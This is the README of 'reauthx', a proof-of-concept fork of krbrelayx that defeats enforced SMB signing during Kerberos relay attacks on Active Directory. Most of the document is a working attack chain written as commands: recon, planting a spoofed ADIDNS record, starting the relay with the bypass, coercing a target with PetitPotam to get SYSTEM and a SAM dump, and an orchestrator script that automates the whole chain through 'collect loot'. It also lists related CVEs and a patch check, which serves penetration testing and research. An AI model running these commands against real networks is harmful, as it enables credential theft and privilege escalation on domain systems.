<div align="center">

# reauthx

**PoC: defeating enforced SMB signing on an SMB relay.**

[![license MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![fork of krbrelayx](https://img.shields.io/badge/fork-krbrelayx-6e40c9.svg)](https://github.com/dirkjanm/krbrelayx)
[![X](https://img.shields.io/badge/%40aas__s3curity-000000?logo=x&logoColor=white)](https://x.com/aas_s3curity)
[![LinkedIn](https://img.shields.io/badge/In-Lyd%C3%A9ric%20Lefebvre-0A66C2?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/lydericlefebvre/)

</div>

---

reauthx is krbrelayx with one extra flag, `--reauth-bypass`. It defeats **enforced SMB signing**, so a
relay still reaches a target that requires signing, like a Domain Controller.

Write-up: [Defeating enforced SMB signing](https://blackfield.ch/blog/defeating-enforced-smb-signing/).

> Heads-up: against a **DC**, reauthx does exactly what krbrelayx does out of the box and dumps the
> **SAM**, not the **NTDS**. Honestly, relaying into a DC over enforced signing wasn't really on the menu
> when krbrelayx was written, so NTDS/DCSync over the reflected session is left as an exercise for the
> reader. PRs very welcome :)

## Run

```bash
pip install -r requirements.txt
```

Example against a signing-required host `FS01` (`10.0.0.10`): `user1` is the low-priv account used
throughout (recon, DNS record, coercion, relay base session); `user2` is only a second account the recon
step needs to test the cross-user swap. The DC at `10.0.0.5` holds the DNS zone, the relay listens on
`10.0.0.50`. `nxc`, `bloodyAD` and `PetitPotam.py` are external tools, not shipped here.

```bash
# 1. recon: signing enforced? where in the patch window?
nxc smb 10.0.0.10 -u user1 -p Passw0rd1 -d AD.LOCAL -M reauth_swap -o PROBE_USER=user2 PROBE_PASS=Passw0rd2
python3 patchcheck.py 'AD.LOCAL/user1:Passw0rd1@10.0.0.10' --probe 'user2:Passw0rd2'

# 2. point a DNS record at the relay
NAME="$(python3 coerce_name.py fs01.ad.local --mode unicode --raw)"
bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local add dnsRecord "$NAME" 10.0.0.50
dig +noidnin +noidnout +short "$NAME.ad.local" @10.0.0.5

# 3. start the relay with the bypass (base session = user1)
sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user1:Passw0rd1'

# 4. coerce the target; the relay forwards it onto FS01 (SYSTEM, SAM dump)
python3 PetitPotam.py -d AD.LOCAL -u user1 -p Passw0rd1 "$NAME" 10.0.0.10

# 5. cleanup
bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local remove dnsRecord "$NAME" 10.0.0.50
```

## Orchestrator

[`reauthx.sh`](reauthx.sh) wraps all five steps behind one CLI. Set the engagement
parameters once; each sub-command uses only the arguments it needs. It defaults to the
**shipped** tools — [`dnstool.py`](dnstool.py) for the ADIDNS record and `nxc coerce_plus`
for coercion — and to the **unicode** name family, which is the one reauthx (Kerberos-only)
can actually reflect. Secrets are masked in all echoed commands.

```bash
# dry-run first: print every command (passwords masked), execute nothing
./reauthx.sh auto -n \
    -T 10.0.0.10 -H fs01.ad.local -d ad.local \
    --dc-host dc01.ad.local --dc-ip 10.0.0.5 -R 10.0.0.50 \
    -u user1 -p Passw0rd1

# the full chain for real: dns-add -> relay (bg) -> coerce -> collect loot -> dns-del.
# a cleanup trap removes the DNS record and stops the relay even on Ctrl-C / error.
sudo ./reauthx.sh auto \
    -T 10.0.0.10 -H fs01.ad.local -d ad.local \
    --dc-host dc01.ad.local --dc-ip 10.0.0.5 -R 10.0.0.50 \
    -u user1 -p Passw0rd1
```

Each step also runs on its own, taking only its arguments:

```bash
./reauthx.sh check                                  # preflight: deps, scripts, tools, root
./reauthx.sh name    -H fs01.ad.local               # just print the coercion record
./reauthx.sh recon   -T 10.0.0.10 -d ad.local -u user1 -p Passw0rd1 \
                     --probe-user user2 --probe-pass Passw0rd2
./reauthx.sh dns-add -H fs01.ad.local -d ad.local --dc-host dc01.ad.local -R 10.0.0.50 -u user1 -p Passw0rd1
./reauthx.sh relay   -T 10.0.0.10 -d ad.local -R 10.0.0.50 -u user1 -p Passw0rd1   # needs sudo
./reauthx.sh coerce  -T 10.0.0.10 -H fs01.ad.local -d ad.local -u user1 -p Passw0rd1
./reauthx.sh dns-del -H fs01.ad.local -d ad.local --dc-host dc01.ad.local -u user1 -p Passw0rd1
```

To mirror the manual flow above instead (external tools), pass `--dns-tool bloodyad`
and `--coerce-tool petitpotam`. `REAUTHX_PASS` / `REAUTHX_PROBE_PASS` keep passwords off
the command line; `./reauthx.sh help` lists every option.

## Credits

- [krbrelayx](https://github.com/dirkjanm/krbrelayx) by [Dirk-jan Mollema](https://github.com/dirkjanm) ; all the heavy lifting is his.
- [Synacktiv](https://www.synacktiv.com) — the reflection chain: **CVE-2025-33073** (CMTI client reflection),
  **CVE-2025-58726** (Ghost SPNs), **CVE-2026-24294** (arbitrary SMB port), **CVE-2026-26128** (Unicode confusable).
- **CVE-2026-69676** (reported by @mad31k) — the same-user re-authentication check that closes `--reauth-bypass`,
  shipped in [KB5124008](https://support.microsoft.com/help/5124008) (8 Sep 2026). `patchcheck.py` tests for it (`#4`).
- [Semperis](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) — Ghost SPNs / Kerberos reflection write-up (CVE-2025-58726).
- SpecterOps (Raj Patel) — *LDAP Switcheroo*: the same re-auth swap against LDAP signing on DCs (the path toward NTDS/DCSync).

## License

MIT, inherited from krbrelayx (see [`LICENSE`](LICENSE)).
